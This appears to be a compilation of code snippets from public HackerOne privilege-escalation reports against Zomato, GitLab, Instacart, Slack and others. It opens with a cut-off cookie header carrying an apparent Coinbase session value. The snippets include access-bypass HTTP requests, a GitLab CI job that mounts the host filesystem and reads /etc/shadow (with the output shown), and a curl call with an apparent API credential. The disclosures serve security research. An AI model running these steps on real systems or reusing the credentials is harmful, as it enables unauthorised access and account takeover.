Cookie: __utma=117893787.1205167212.1468114999.1475980536.1476020583.48; __utmz=117893787.1475796788.43.5.utmcsr=google|utmccn=(organic)|utmcmd=organic|utmctr=https%3A%2F%2Fwww.coinbase.com%2Fusers%2Ffa1f4606a31526801960b8c5703e2fa3%2Fverify; _coinbase=SDhMZytnck5TRi9McEMvMnpzY09OcjhJSlZ3TTZwYlFpWEZWcVlXcW13a1UzL3ZwdVFpdUlBd3RJSXBnSEhnOXZNZkExS1EyQXNNMitWSDVtQVpMVTdrdFRZTGFPRkVFMjZUbGZpVUhaYXA2aFdZa2hmWk55c0JzODM3ZzR0cHFTTmF1RHduOGhuZHFoOExDQ3craFdBWlJDalpOckhISlVtdzArWVMvdy9VSzJ2ZG9tejVIN3FQZXltSTlpeHRMd1VnNVRJL296b0tCT2VkWDlhaVJTWlU0ZkJDVkpPVFVwVXBnY09SVE5tcHVsYXNyMzdmUDdLS0NEbUhPSnI1d2ptM2JFcHFEQ0xQK1VCOWxMZXJFVG9HNlR1MnJXVk9TNjJuczlMN2NQdytWQnVuenZQeVI0bTF0dEc4b0FnWVY0WVZOcUVqOXE1RjYxVUVHV2pXSEdmTDVaYXI4dGNuVFhLb3JJb1N6eGwyMXNPSDRzWXRXNGhMd3l6aS8vSmp1bE94VlVYcit3UEVjc1JaKzVQalFlQzZuNnZLcDMwRE95UHR3MEpIUk1XZnliRlNSR
```

## #300454 [www.zomato.com] Privilege Escalation - /php/restaurant_menus_handler.php — eternal — $200 — Privilege Escalation
Source: `hackerone/reports/2018/300454.md` (https://hackerone.com/reports/300454)

```
$.ajax({url:"/php/restaurant_menus_handler.php",type:"POST",data:{action:"toggle-res-menu-type",res_id:██████}
```

## #716677 Domain Takeover - gl-canary.freetls.fastly.net — gitlab — $200 — Privilege Escalation
Source: `hackerone/reports/2023/716677.md` (https://hackerone.com/reports/716677)

```
Content-Security-Policy: connect-src 'self' https://assets.gitlab-static.net https://gl-canary.freetls.fastly.net wss://gitlab.com https://sentry.gitlab.net https://customers.gitlab.com https://snowplow.trx.gitlab.net; frame-ancestors 'self'; frame-src 'self' https://www.google.com/recaptcha/ https://www.recaptcha.net/ https://content.googleapis.com https://content-compute.googleapis.com https://content-cloudbilling.googleapis.com https://content-cloudresourcemanager.googleapis.com https://*.codesandbox.io; img-src * data: blob:; object-src 'none'; script-src 'self' 'unsafe-inline' 'unsafe-eval' https://assets.gitlab-static.net https://gl-canary.freetls.fastly.net https://www.google.com/recaptcha/ https://www.recaptcha.net/ https://www.gstatic.com/recaptcha/ https://apis.google.com 'nonce-bjSllX/7AnVrXL1QQxsb+w=='; style-src 'self' 'unsafe-inline' https://assets.gitlab-static.net https://gl-canary.freetls.fastly.net; worker-src https://assets.gitlab-static.net https://gl-canary.freetls.fastly.net https://gitlab.com blob:
```

## #173969 Full access to any list — instacart — $150 — Privilege Escalation
Source: `hackerone/reports/2016/173969.md` (https://hackerone.com/reports/173969)

```
    POST /api/v2/list_users
    Host: www.instacart.com
    Content-Type: application/json
    Cookie: ...
    X-CSRF-Token: ...
    
    {"list_user":{"list_id":10,"email":"your@email.com"}}
    
```

```
GET https://www.instacart.com/api/v2/lists/10

{"meta":{"code":200},"data":{"id":10,"name":"Test sameoldstory" ...
```

```
    '''
    POST /api/v2/list_users
    Host: www.instacart.com
    Content-Type: application/json
    Cookie: ...
    X-CSRF-Token: ...
```

## #1256389 Subdomain takeover of main domain of https://www.cyberlynx.lu/ — acronis — $100 — Privilege Escalation
Source: `hackerone/reports/2021/1256389.md` (https://hackerone.com/reports/1256389)

```
    1. Go to http://site.therealreal.com , Gives 404
    2. the domain pointing towards to WIX cdn
    3. Anyone can claim this subdomain
```

## #824909 Subdomain Takeover uptime — btfs — $100 — Privilege Escalation
Source: `hackerone/reports/2020/824909.md` (https://hackerone.com/reports/824909)

```
POC:
------

1 - open https://uptime.btfs.io/
2 - you need a password to login 
```

## #147369 User can start call in a channel of an unpaid account — slack — $100 — Privilege Escalation
Source: `hackerone/reports/2016/147369.md` (https://hackerone.com/reports/147369)

```
POST /api/screenhero.rooms.create?_x_id=<ID> HTTP/1.1
Host: account.slack.com
...

------WebKitFormBoundaryoqDvFcsV6Y4A1ByJ
Content-Disposition: form-data; name="regions"

west|east|ap|eu
------WebKitFormBoundaryoqDvFcsV6Y4A1ByJ
Content-Disposition: form-data; name="protocol"

1.0
------WebKitFormBoundaryoqDvFcsV6Y4A1ByJ
Content-Disposition: form-data; name="channel"

D1CCM92P5
------WebKitFormBoundaryoqDvFcsV6Y4A1ByJ
Content-Disposition: form-data; name="token"

<SLACK API TOKEN>
------WebKitFormBoundaryoqDvFcsV6Y4A1ByJ--
```

```
POST /api/screenhero.rooms.create?_x_id=<ID> HTTP/1.1
Host: account.slack.com
...

------WebKitFormBoundaryoqDvFcsV6Y4A1ByJ
```

## #1417211 Installing Gitlab runner with Docker-In-Docker allows root access — gitlab — $100 — Privilege Escalation
Source: `hackerone/reports/2022/1417211.md` (https://hackerone.com/reports/1417211)

```
sudo gitlab-runner register -n \
  --url https://gitlab.com/ \
  --registration-token REGISTRATION_TOKEN \
  --executor docker \
  --description "My Docker Runner" \
  --docker-image "docker:19.03.12" \
  --docker-volumes /var/run/docker.sock:/var/run/docker.sock
```

```
stages:
  - exploiter
exploiter:
    stage: exploiter
    when: manual
    tags:
      - exploiter
    script:
      - docker run --rm  --net=host --pid=host --ipc=host --volume /:/host ubuntu bash -c "cat /host/etc/shadow"
```

```
Running with gitlab-runner 14.5.1 (de104fcd)
  on My Docker Runner 4j_ZSXte
Preparing the "docker" executor 00:04
Using Docker executor with image docker:19.03.12 ...
Pulling docker image docker:19.03.12 ...
Using docker image sha256:81f5749c9058a7284e6acd8e126f2b882765a17b9ead14422b51cde1a110b85c for docker:19.03.12 with digest docker@sha256:d41efe7ad0df5a709cfd4e627c7e45104f39bbc08b1b40d7fb718c562b3ce135 ...
Preparing environment 00:02
Running on runner-4jzsxte-project-28249719-concurrent-0 via ubuntu-g1-1-1-25-su-1...
Getting source from Git repository 00:03
Fetching changes with git depth set to 50...
Reinitialized existing Git repository in /builds/foroozan2/barika/.git/
Checking out e64249e2 as main...
Skipping Git submodules setup
Executing "step_script" stage of the job script 00:10
Using docker image sha256:81f5749c9058a7284e6acd8e126f2b882765a17b9ead14422b51cde1a110b85c for docker:19.03.12 with digest docker@sha256:d41efe7ad0df5a709cfd4e627c7e45104f39bbc08b1b40d7fb718c562b3ce135 ...
$ docker run --rm --privileged --net=host --pid=host --ipc=host --volume /:/host ubuntu bash -c "cat /host/etc/shadow"
Unable to find image 'ubuntu:latest' locally
latest: Pulling from library/ubuntu
7b1a6ab2e44d: Pulling fs layer
7b1a6ab2e44d: Verifying Checksum
7b1a6ab2e44d: Download complete
7b1a6ab2e44d: Pull complete
Digest: sha256:626ffe58f6e7566e00254b638eb7e0f3b11d4da9675088f4781a50ae288f3322
Status: Downloaded newer image for ubuntu:latest
root:*:18438:0:99999:7:::
daemon:*:1843
```

## #50884 Bypass pin(4 digit passcode on your android app) — whisper — $100 — Privilege Escalation
Source: `hackerone/reports/2015/50884.md` (https://hackerone.com/reports/50884)

```
    Parent Activity: sh.whisper.WMainV4Activity
```

## #493324 Privilege escalation from any user (including external) to gitlab admin when admin impersonates you — gitlab — - — Privilege Escalation
Source: `hackerone/reports/2020/493324.md` (https://hackerone.com/reports/493324)

```
document.cookie = "_gitlab_session=█████";
```

## #2081930 Bypass report submit restriction/ban using the API key — security — - — Privilege Escalation
Source: `hackerone/reports/2023/2081930.md` (https://hackerone.com/reports/2081930)

```
curl "https://api.hackerone.com/v1/hackers/reports"   -X POST   -u "testhackerone-creative:pYnONekvxUTvHbKF7Jp64qh9STIhhdXvKmefWOeR8YU="   -H 'Content-Type: application/json'   -H 'Accept: application/json'   -d @- <<EOD
{
  "data": {
    "type": "report",
    "attributes": {
      "team_handle": "HackerOne-test_h1b",
      "title": "string",
      "vulnerability_information": "test tst tst",
      "impact": "tst tst",
      "severity_rating": "none",
      "weakness_id": 1
    }
  }
}
EOD
```

```
    "type": "report",
    "attributes": {
      "team_handle": "HackerOne-test_h1b",
      "title": "string",
      "vulnerability_information": "test tst tst",
      "impact": "tst tst",
      "severity_rating": "none",
      "weakness_id": 1
    }
```

